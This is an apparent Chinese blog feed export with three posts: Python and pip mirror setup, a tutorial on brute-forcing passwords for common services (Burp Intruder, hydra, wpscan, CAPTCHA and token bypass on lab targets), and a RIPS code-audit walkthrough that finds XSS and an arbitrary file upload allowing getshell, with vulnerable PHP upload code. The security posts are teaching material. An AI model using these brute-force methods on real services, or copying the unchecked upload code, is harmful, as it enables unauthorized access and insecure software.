title="（2）安装Python2"></a>（2）安装Python2</h3><p>关于python2的安装实际上和python3一样 , 只不过下载的安装包不一样</p><p>官网 : <a href="https://www.python.org/downloads/release/python-2718/">https://www.python.org/downloads/release/python-2718/</a><br><img src="http://120.48.107.243:9090/blog/2023/04/03/96a62e064c424d39aee63be4cb4ac545.png" alt="在这里插入图片描述"><br>镜像站：<a href="http://npm.taobao.org/mirrors/python/2.7.9/">http://npm.taobao.org/mirrors/python/2.7.9/</a></p><h3 id="（3）添加环境变量"><a href="#（3）添加环境变量" class="headerlink" title="（3）添加环境变量"></a>（3）添加环境变量</h3><p>就是把python的<code>安装目录</code>和<code>Script目录</code>添加到<code>path</code>这个系统变量 , 这里为了区分python2和python3 , 可以这样操作，先把各个版本的<code>python.exe</code>复制然后重命名为<code>python2.exe</code>和<code>python3.exe</code><br><img src="http://120.48.107.243:9090/blog/2023/04/03/0fdf6b19009844f787e25ba0da31af4b.png" alt="在这里插入图片描述"><br>打开环境变量<br><img src="http://120.48.107.243:9090/blog/2023/04/03/58dee1eabba144f18541927b86c1a67f.png" alt="在这里插入图片描述"><br>在系统变量的path中加入下图所示，应用确定<br><img src="http://120.48.107.243:9090/blog/2023/04/03/4fab164396a74b20ac17663d88fe7e8c.png" alt="在这里插入图片描述"></p><h3 id="（4）验证"><a href="#（4）验证" class="headerlink" title="（4）验证"></a>（4）验证</h3><p>win+r打开cmd，输入python2和python3，出现下面提示就表示配置完成<br><img src="http://120.48.107.243:9090/blog/2023/04/03/d258f869f0b1443692e1c791d985fdc9.png" alt="在这里插入图片描述"></p><h2 id="2、CentOS安装Python"><a href="#2、CentOS安装Python" class="headerlink" title="2、CentOS安装Python"></a>2、CentOS安装Python</h2><p>如果原系统已经存在python3了 , 但是是老版本的 , 你可以先先卸载</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum remove python3</span><br></pre></td></tr></table></figure><p>手动安装</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>）前往用户根目录</span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>）安装依赖包</span><br><span class="line">yum install gcc openssl<span class="literal">-devel</span> bzip2<span class="literal">-devel</span> libffi<span class="literal">-devel</span> <span class="literal">-y</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>）下载并解压安装包</span><br><span class="line"><span class="built_in">curl</span> <span class="literal">-O</span> https://www.python.org/ftp/python/<span class="number">3.9</span>.<span class="number">0</span>/Python<span class="literal">-3</span>.<span class="number">9.0</span>.tgz</span><br><span class="line">注：不同的版本修改版本号<span class="number">3.9</span>.<span class="number">0</span>即可 , 如果下载过慢 ,也可以使用镜像站</span><br><span class="line"><span class="built_in">wget</span> http://npm.taobao.org/mirrors/python/<span class="number">3.9</span>.<span class="number">0</span>/Python<span class="literal">-3</span>.<span class="number">9.0</span>.tgz</span><br><span class="line">    </span><br><span class="line">tar <span class="literal">-zxvf</span> Python<span class="literal">-3</span>.<span class="number">9.0</span>.tgz</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>）进入目标文件</span><br><span class="line"><span class="built_in">cd</span> Python<span class="literal">-3</span>.<span class="number">9.0</span></span><br><span class="line"></span><br><span class="line"><span class="number">5</span>）配置安装路径：/usr/local/python3</span><br><span class="line">./configure prefix=/usr/local/python3</span><br><span class="line"></span><br><span class="line"><span class="number">6</span>）编译并安装</span><br><span class="line">make &amp;&amp; sudo make install</span><br><span class="line"></span><br><span class="line"><span class="number">7</span>）建立软连接：终端命令 python3，pip3</span><br><span class="line">ln <span class="literal">-s</span> /usr/local/python3/bin/python3 /usr/bin/python3</span><br><span class="line">ln <span class="literal">-s</span> /usr/local/python3/bin/pip3 /usr/bin/pip3</span><br><span class="line"></span><br><span class="line"><span class="number">8</span>) 验证</span><br><span class="line">python3 <span class="literal">--version</span></span><br><span class="line">pip3 <span class="literal">--version</span></span><br><span class="line"></span><br><span class="line"><span class="number">9</span>）删除安装包与文件：</span><br><span class="line"><span class="built_in">rm</span> <span class="literal">-rf</span> Python<span class="literal">-3</span>.<span class="number">9.0</span></span><br><span class="line"><span class="built_in">rm</span> <span class="literal">-rf</span> Python<span class="literal">-3</span>.<span class="number">9.0</span>.tgz</span><br></pre></td></tr></table></figure><h2 id="3、Ubuntu安装Python"><a href="#3、Ubuntu安装Python" class="headerlink" title="3、Ubuntu安装Python"></a>3、Ubuntu安装Python</h2><p>ubuntu默认是安装python2和python3的 , 但是如果你的ubuntu发行版本过低导致你需要的python3版本太低 , 可能不满足你的需求</p><p><strong>千万不要卸载ubuntu 桌面版自带的python版本</strong>，否则会开不了机。<br>安装方法</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install software<span class="literal">-properties-common</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span>、使用Apt<span class="literal">-Get</span>安装Python <span class="number">3.9</span></span><br><span class="line">Apt软件包管理器提供了在Ubuntu系统上安装Python <span class="number">3.9</span>的简单方法。请按照以下步骤操作：</span><br><span class="line">打开系统上的终端，然后为系统配置Deadsnakes PPA。</span><br><span class="line">sudo <span class="built_in">add-apt</span><span class="literal">-repository</span> ppa:deadsnakes/ppa</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>.在Ubuntu系统上添加ppa后，更新apt缓存并在Ubuntu上安装Python <span class="number">3.9</span>。</span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install python3.<span class="number">9</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>.等待安装完成。通过执行以下命令检查Python版本：</span><br><span class="line">python3.<span class="number">9</span> <span class="literal">-V</span></span><br><span class="line">至此，Python <span class="number">3.9</span>已安装在Ubuntu系统上并可以使用。</span><br><span class="line"></span><br><span class="line">修改软连接 , 不是很推荐就用python3.<span class="number">9</span>吧</span><br><span class="line">sudo <span class="built_in">rm</span> /usr/bin/python3</span><br><span class="line">sudo ln <span class="literal">-s</span> python3.<span class="number">7</span> python3</span><br></pre></td></tr></table></figure><p>但是默认是没有pip3指向python3.9的 , 解决办法</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">安装pip3-&gt;python3.<span class="number">9</span></span><br><span class="line"><span class="comment"># 安装pip3 </span></span><br><span class="line"><span class="built_in">wget</span> https://bootstrap.pypa.io/<span class="built_in">get-pip</span>.py  //下载安装脚本。</span><br><span class="line">python3.<span class="number">9</span> <span class="built_in">get-pip</span>.py  //执行安装脚本</span><br><span class="line">如果报错 ,  ModuleNotFoundError: No module named <span class="string">&#x27;distutils.cmd&#x27;</span></span><br><span class="line">sudo apt<span class="literal">-get</span> install python3<span class="literal">-distutils</span></span><br><span class="line">sudo <span class="built_in">cp</span> <span class="literal">-r</span> /usr/lib/python3.<span class="number">6</span>/distutils /usr/lib/python3.<span class="number">9</span>/</span><br><span class="line">然后再执行</span><br><span class="line">python3.<span class="number">9</span> <span class="built_in">get-pip</span>.py</span><br><span class="line"></span><br><span class="line">pip3.<span class="number">9</span> <span class="literal">-V</span>  //查看当前pip3的版本</span><br><span class="line"></span><br><span class="line">ubuntu  python版本 推荐方案 : 安装python3.<span class="number">9</span> , 然后安装pip3-&gt;python3.<span class="number">9</span></span><br></pre></td></tr></table></figure><p>注意：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">kali虽然默认已经安装了python2和最先版本的python3 , 但是没有区分pip2和pip3</span><br><span class="line"></span><br><span class="line">解决方法</span><br><span class="line"><span class="comment"># 安装pip2</span></span><br><span class="line"><span class="built_in">wget</span> https://bootstrap.pypa.io/pip/<span class="number">2.7</span>/<span class="built_in">get-pip</span>.py   //下载安装脚本。基于当前python2的具体版本</span><br><span class="line">python2 <span class="built_in">get-pip</span>.py            // 执行脚本</span><br><span class="line">pip2 <span class="literal">-V</span>                              //查看当前pip2的版本</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装pip3 ( 两个不要在一个目录下 )</span></span><br><span class="line"><span class="built_in">wget</span> https://bootstrap.pypa.io/<span class="built_in">get-pip</span>.py  //下载安装脚本。</span><br><span class="line">python3 <span class="built_in">get-pip</span>.py  //执行安装脚本</span><br><span class="line">pip3 <span class="literal">-V</span>  //查看当前pip3的版本</span><br></pre></td></tr></table></figure><h1 id="二、PIP换源"><a href="#二、PIP换源" class="headerlink" title="二、PIP换源"></a>二、PIP换源</h1><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pip  pip.exe  python的包管理工具 , 通过它可以下载安装一下第三方库</span><br><span class="line">pip3 install xxx</span><br><span class="line"></span><br><span class="line">npm</span><br><span class="line">apt</span><br><span class="line">yum</span><br><span class="line">brew</span><br></pre></td></tr></table></figure><h2 id="1、Windows-PIP换源"><a href="#1、Windows-PIP换源" class="headerlink" title="1、Windows PIP换源"></a>1、Windows PIP换源</h2><h3 id="（1）win-r输入-APPDATA"><a href="#（1）win-r输入-APPDATA" class="headerlink" title="（1）win+r输入%APPDATA%"></a>（1）win+r输入%APPDATA%</h3><p><img src="http://120.48.107.243:9090/blog/2023/04/03/a240827f33fc4baeb851bd3e2a19e998.png" alt="在这里插入图片描述"><br>###（2）进入目录后，新建一个文件夹PIP，并在该文件夹里面新建文件pip.ini<br><img src="http://120.48.107.243:9090/blog/2023/04/03/41b75fac923643fea6694eb1d8b66bce.png" alt="在这里插入图片描述"><br>并在pip.ini文件里面写入以下内容：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[<span class="type">global</span>]</span><br><span class="line">timeout=<span class="number">6000</span></span><br><span class="line">index<span class="literal">-url</span>=https://pypi.tuna.tsinghua.edu.cn/simple/</span><br></pre></td></tr></table></figure><p>或者是</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[<span class="type">global</span>]</span><br><span class="line">timeout=<span class="number">6000</span></span><br><span class="line">index<span class="literal">-url</span>=http://pypi.douban.com/simple</span><br><span class="line">trusted<span class="literal">-host</span>=pypi.douban.com</span><br></pre></td></tr></table></figure><h2 id="2、Linux-PIP换源"><a href="#2、Linux-PIP换源" class="headerlink" title="2、Linux PIP换源"></a>2、Linux PIP换源</h2><p>无论是那种Linux发行版本，换源的方法都一样<br>配置PIP源，提高下载速度</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir ~/.pip &amp;&amp; touch ~/.pip/pip.conf</span><br><span class="line">vim ~/.pip/pip.conf</span><br></pre></td></tr></table></figure><p>内容如下：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[<span class="type">global</span>]</span><br><span class="line">timeout=<span class="number">6000</span></span><br><span class="line">index<span class="literal">-url</span>=http://pypi.douban.com/simple</span><br><span class="line">trusted<span class="literal">-host</span>=pypi.douban.com</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程学习 </category>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程学习 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码暴力破解</title>
      <link href="/2022/01/21/passwd_crack/"/>
      <url>/2022/01/21/passwd_crack/</url>
      
        <content type="html"><![CDATA[<h1 id="一、简介以及注意事项"><a href="#一、简介以及注意事项" class="headerlink" title="一、简介以及注意事项"></a>一、简介以及注意事项</h1><h2 id="1、穷举就是枚举的意思"><a href="#1、穷举就是枚举的意思" class="headerlink" title="1、穷举就是枚举的意思"></a>1、穷举就是枚举的意思</h2><h2 id="2、从来没有哪个时代的黑客像今天一样热衷于猜解密码"><a href="#2、从来没有哪个时代的黑客像今天一样热衷于猜解密码" class="headerlink" title="2、从来没有哪个时代的黑客像今天一样热衷于猜解密码"></a>2、从来没有哪个时代的黑客像今天一样热衷于猜解密码</h2><h2 id="3、文章只是为了现在的信息安全，供学习交流，不得去做违规的行为。"><a href="#3、文章只是为了现在的信息安全，供学习交流，不得去做违规的行为。" class="headerlink" title="3、文章只是为了现在的信息安全，供学习交流，不得去做违规的行为。"></a>3、文章只是为了现在的信息安全，供学习交流，不得去做违规的行为。</h2><h2 id="4、简介"><a href="#4、简介" class="headerlink" title="4、简介"></a>4、简介</h2><p>在互联网的今天，需要使用某种的服务，大多数都需要口令登录，这个口令就是密码，密码的强度分为弱口令，中度口令，强度口令，如果登录的服务为弱口令，那会存在很大的安全隐患，黑客通过穷举口令对服务进行攻击，很容易就得到登录密码。得到没密码之后就能登录服务， 进行其他危害较大的操作，黑客也能通过对用户的信息整理，组合密码进行穷举攻击。<br>#二、正文<br>##1、常见的服务</p><ul><li>WEB——80端口</li><li>mysql——3306端口</li><li>sql server——1433端口</li><li>https——443端口</li><li>ftp——21端口</li><li>ssh——22端口</li><li>dns——53端口</li><li>tomcat——8080端口</li><li>redis——6379端口</li><li>rsync——873端口</li><li>PostgreSQL——5432端口</li><li>cobaltstrike teamserver——50050端口</li><li>smtp——25端口</li><li>pop3——110端口</li><li>远程登录rdp——3389端口</li><li>smb——445端口</li><li>rpc——135端口</li><li>imap——143端口</li><li>netBIOS——139端口</li><li>SMTPS——465端口</li><li>POP3S——995端口</li><li>mogodb——27018端口</li><li>memcached——11211端口</li><li>telnet——23端口</li><li>oracle——1521端口</li></ul><h2 id="2、密码字典"><a href="#2、密码字典" class="headerlink" title="2、密码字典"></a>2、密码字典</h2><p>kali自带字典：&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;<br>github上很多，请自行搜索。<br>##3、Burp穷举后台密码<br>截取到包后发送到intruder给密码设置变量，使用集束炸弹可以测试。<br>##4、Burp对webshell穷举<br>黑客对网站攻破后，一般会留后门方便对其网站进行非法管理。后门的程序语言包括asp，PHP，net这些脚本文件放在网站目录，一般都采用单密码进行登录，通过扫描获取webshell的后门网址，得到网址后可以对其进行密码穷举。<br>截取到包后，可以右键转换请求方法，发送到intruder给密码设置变量。<br>##5、cheetah对一句后门密码穷举<br>cheetah是针对一句话后门的穷举工具。<br><img src="https://img-blog.csdnimg.cn/acc1d0dacf284809866eaf999c5f4f38.png" alt="在这里插入图片描述"></p><h2 id="6、有token防御的网站后台穷举"><a href="#6、有token防御的网站后台穷举" class="headerlink" title="6、有token防御的网站后台穷举"></a>6、有token防御的网站后台穷举</h2><p>有的网站后台存在token值，这个token通俗的名字叫令牌，每次刷新页面都会随机变化，提交请求时必须携带这个token值，可以利用这点避免后台进行直接穷举和防止csrf攻击。<br>我们每次刷新，都可以看到这个token的值会改变。<br>但是如果直接爆破的话会是用的第一次token的值，如果第二次密码进行匹配的时候，他还是第一次的token的值的话，服务端那边的token值就是不匹配的，所以会提示csrf攻击，所以我们每次进行爆破的时候也要让他跟随改变。<br>可以在pikachu平台上练习。<br>token抓取——token爆破——脚本爆破。<br>##7、验证码绕过（on client）<br>皮卡丘平台上也有。<br>快速判断在页面中哪些功能点使用了javascript脚本代码可以使用浏览器中的disable javascript插件来进行检查。<br><img src="https://img-blog.csdnimg.cn/5cdc69c10837407bb97c3f2f5b23b408.png" alt="在这里插入图片描述"><br>检查后可以将抓取用户登录的数据包发送到repeater模块中，多次重放发现服务端并没有做检查，然后将处于proxy模块的数据包发送到intruder模块下，设置attack type为狙击手模式，并设置password字段值为攻击向量，添加字典进行爆破。<br>##8、验证码绕过（on server）<br>进入靶机尝试以下方式登录，并观察结果。<br><img src="https://img-blog.csdnimg.cn/2fbb46c3f86945bf94e80d67010dbcab.png" alt="在这里插入图片描述"><br>填写错误的用户密码与正确的验证码并抓取用户登录数据包发送到Repeater模块下，改变验证码或不填，来判断后台是否对验证码进行校验。<br>后台对验证码进行了校验，我们不能使用之前的方法进行破解，但是如果验证码不具备时效性，及同一个正确的验证码可以反复使用的话，我们可以通过不改变验证码的变量进行暴力破解，为了再判断验证码的时效性（后台是否会在一段时间内对验证码刷新并重新进行校验）填写正确的验证码再随意填写用户名和密码并多次重复这个步骤。<br>通过服务器多次发回的响应，username or password is not exists 判断，这个验证码不具备时效性，后台不会在一段时间内刷新验证重新进行校验，同一个验证码同样具有有效性，那么就可以使用之前的方法来进行暴力破解。将POST请求发送到Intruder模块下，点击clear$清除变量，再将账户和密码设置变量，同时将验证码填为正确的验证码。<br>##9、验证码识别爆破<br>验证码干扰像素太少很容易会被一些工具识别出来，可以用图片提取工具，也可以用工具codex验证码后台登录爆破辅助工具。<br>##10、phpmyadmin密码穷举<br>phpmyadmin是mysql的一个web管理工具，可以通过这个工具穷举mysql用户的账号和密码。<br>##11、wordpress博客系统用户密码穷举<br>wordpress是知名的博客系统，在互联网上的占有量很大，所以一定要知道这套系统的弱口令穷举的方法。<br>爆破wordpress博客系统的话我们会用到wpscan这个工具，专门针对于wordpress博客系统进行安全评估的工具。<br>爆破之前我们需要先获取一个token，因为wordpress有很多插件，需要使用woken去加载插件，然后进行安全评估。<br>&#x3D;&#x3D;kali自带wpscan。&#x3D;&#x3D;<br>##12、metasploit穷举模块的使用<br>metasploit是一个渗透测试集成套件，同样也有穷举模块。<img src="http://120.48.107.243:9090/blog/2023/04/03/e1ac012ee1a7496fb47b58661f91cf7a.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/03/bc69f8dcfc6b4591bcae3b1c5dbf1ef1-20230403134920992.png" alt="在这里插入图片描述"></p><h2 id="13、hydra密码穷举工具的使用"><a href="#13、hydra密码穷举工具的使用" class="headerlink" title="13、hydra密码穷举工具的使用"></a>13、hydra密码穷举工具的使用</h2><p>hydra是一个相当强大的暴力密码破解工具。该工具支持几乎所有协议的在线密码破解，如FTP、HTTP、HTTPS、MySQL、Oracle、Cisco、IMAP、VNC等，其密码能否被破解，关键在于字典是足够强大，很多用户可能对hydra比较熟悉，因为该工具有图形界面，且操作十分简单，基本上可以傻瓜操作。<br>&#x3D;&#x3D;hydra是著名组织thc的一款开源的暴力破解密码工具，功能非常强大。&#x3D;&#x3D;<br>&#x3D;&#x3D;kali下是默认安装的，几乎支持所有协议的在线破解。&#x3D;&#x3D;<br>密码能否破解，在于字典是否强大以及电脑的性能。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/3a1befdb4e6a4375a570ca82efc9770f.png" alt="在这里插入图片描述"></p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/db88082558664c6fbbe4da97479fa99c.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/03/b07d15ee7ee74e798c8278efd3eac96b.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/03/f255161f095c4b85851864f673f60ade.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/03/5db6e7165b00450a8ddaff45389ee861.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/03/0061931f684a406698c91b7a26aeb882.png" alt="在这里插入图片描述"></p><h2 id="14、御剑RDP爆破工具的使用"><a href="#14、御剑RDP爆破工具的使用" class="headerlink" title="14、御剑RDP爆破工具的使用"></a>14、御剑RDP爆破工具的使用</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/e9a92f3dc9a442d8b3f02924803841ad.png" alt="在这里插入图片描述"><br>##15、Apache-tomcat服务进行穷举<br><img src="http://120.48.107.243:9090/blog/2023/04/03/a74fac053fd34436bda36d9489426021.png" alt="在这里插入图片描述"><br>##16、超级弱口令穷举使用<br><img src="http://120.48.107.243:9090/blog/2023/04/03/6ac9e5024f0148a58311108c636db14a.png" alt="在这里插入图片描述"><br>#三、总结与后记<br>请大家务必在设置密码时使用强密码，请勿使用弱口令，最好不要涉及自己的个人信息，本篇文章仅供学习交流，请勿干坏事。</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 漏洞学习 </category>
          
          <category> 密码暴力破解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全 </tag>
            
            <tag> 漏洞学习 </tag>
            
            <tag> 密码暴力破解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代码审计工具</title>
      <link href="/2022/01/18/code_read_tools/"/>
      <url>/2022/01/18/code_read_tools/</url>
      
        <content type="html"><![CDATA[<p><img src="http://120.48.107.243:9090/blog/2023/04/01/1fcf3868f39e45bea4506ffd1317d8d3.png" alt="在这里插入图片描述"><br>图片来源于百度图片。<br><strong>注意：本篇文章仅用于自我学习，笔记记录，不得用于其他用途。</strong></p><h1 id="一、引子"><a href="#一、引子" class="headerlink" title="一、引子"></a>一、引子</h1><p>在攻方面，传统的黑盒模式是通过扫描器扫描站点或利用NDAY来渗透的方式已经受到了很大的制约，现在及未来的渗透测试发展方向是白盒测试 , 也就是代码审计 , 无论是挖0day还是企业渗透测试 , 白盒都是最快最准确的挖掘姿势拿到源代码–&gt;代码审计–&gt;利用审计出来的漏洞制定措施，所以代码审计能力也越发重要。<br><strong>最好是工具和人工结合使用。</strong></p><h1 id="二、审计工具"><a href="#二、审计工具" class="headerlink" title="二、审计工具"></a>二、审计工具</h1><p>工欲善其事 必先利其器，使用自动化工具代替人工挖掘，可以显著提高审计工作的效率，学会利用自动化代码审计工具，是每个代码审计人员必备的技能<br>自动审计工具： </p><ul><li>RIPS  </li><li>Seay </li><li>fortify</li></ul><h1 id="三、代码审计环境搭建"><a href="#三、代码审计环境搭建" class="headerlink" title="三、代码审计环境搭建"></a>三、代码审计环境搭建</h1> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">phpstudy2018 + php5.4 + 留言板源码</span><br><span class="line">解压到www根目录</span><br><span class="line">修改cs.com\lib\config.php 数据库配置</span><br><span class="line">链接mysql数据库 , 创建数据库</span><br><span class="line">create database message;</span><br><span class="line">use message;</span><br><span class="line">source D:\\phpStudy\\PHPTutorial\\WWW\\cs.com\\lib\\test_message.sql;</span><br><span class="line">访问</span><br><span class="line">http://cs.com</span><br><span class="line">管理员/密码</span><br><span class="line">admin/admin</span><br></pre></td></tr></table></figure><h1 id="四、RIPS"><a href="#四、RIPS" class="headerlink" title="四、RIPS"></a>四、RIPS</h1><p>它是一款开源的，具有较强的漏洞挖掘能力的自动化代码审计工具，由PHP语言编写，<strong>用于静态审计PHP代码</strong><br>也可以采用正则方式扫描代码发现漏洞；还能够采用自定义的语法扫描代码发现问题<br>官网：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://rips-scanner.sourceforge.net/</span><br></pre></td></tr></table></figure><p>解压下载的zip文件到Web服务器网站目录下即可。在浏览器中输入Web服务器地址和对应目录<br>主界面介绍：<br><img src="http://120.48.107.243:9090/blog/2023/04/01/10708ac653e84fa289c71f7a8451110b.png" alt="在这里插入图片描述"></p><table><thead><tr><th>功能</th><th>描述</th></tr></thead><tbody><tr><td>subdirs</td><td>如果勾选上这个选项，会扫描所有子目录，否则只扫描一级目录，缺省为勾选</td></tr><tr><td>verbosity level</td><td>选择扫描结果的详细程度，默认为1(建议就使用1)</td></tr><tr><td>vuln type</td><td>选择需要扫描的漏洞类型。支持命令注入、代码执行、SQL注入等十余种漏洞类型，默认为全部扫描</td></tr><tr><td>code style</td><td>选择扫描结果的显示风格（支持9种语法高亮）。</td></tr><tr><td>&#x2F;regex&#x2F;</td><td>使用正则表达式过滤结果</td></tr><tr><td>path&#x2F;file</td><td>要扫描的目录</td></tr><tr><td>scan</td><td>开始扫描</td></tr></tbody></table><p>访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://rip.com/</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/01/c72eefe2ff134fb9853f980e73fd2b45.png" alt="在这里插入图片描述"></p><p>实验 : 使用RIPS  对留言板源码进行扫描<br>访问<br>输入地址 , 开始扫描<br><img src="http://120.48.107.243:9090/blog/2023/04/01/d9cd6b3fc70d40df81be33cf5c32afc7.png" alt="在这里插入图片描述"></p><h2 id="1、xss漏洞"><a href="#1、xss漏洞" class="headerlink" title="1、xss漏洞"></a>1、xss漏洞</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/01/80bd9909124d4dd8860bd351052aafc8.png" alt="在这里插入图片描述"></p><p>访问对应地址 , 抓包复现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://cs.com/admin/index.php</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/01/963389c2499c4a85a7112c810e3231e1.png" alt="在这里插入图片描述"><br>修改之后 , 放过数据包<br><img src="http://120.48.107.243:9090/blog/2023/04/01/f41405589bf682b3a680b6844532eef0.png" alt="image-20220401163718257"><br>直接跳转到首页 , 复现失败 , 因为在index.php也会做一个cookie的校验</p><h2 id="2、文件上传漏洞"><a href="#2、文件上传漏洞" class="headerlink" title="2、文件上传漏洞"></a>2、文件上传漏洞</h2><p>路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">File: E:\phpstudy_pro\WWW\cs.com/admin/admin_check.php</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/01/cfe4ca7150b34dbbae3e99c15ee66f8a.png" alt="在这里插入图片描述"></p><p>通过浏览网站发现只有修改头型 , 有上传点 , 测试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://cs.com/user_edit.php</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/01/a2f94759fa0d41f49e39c168e9074aa9.png" alt="在这里插入图片描述"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://cs.com/upload/images/2022_09_20/Upload_2022_09_20_16_54_43_160791.php</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/01/0565a5db2b2f4de381970f3e8a88925e.png" alt="在这里插入图片描述"></p><p>存在任意文件上传 , 可以getshell , 查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upFile</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$dir</span> = PATH.<span class="string">&quot;/upload/images/&quot;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y_m_d&#x27;</span>);</span><br><span class="line"><span class="variable">$dir_bak</span> = <span class="string">&quot;/upload/images/&quot;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y_m_d&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">is_dir</span>(<span class="variable">$dir</span>) || <span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>,<span class="number">0777</span>,<span 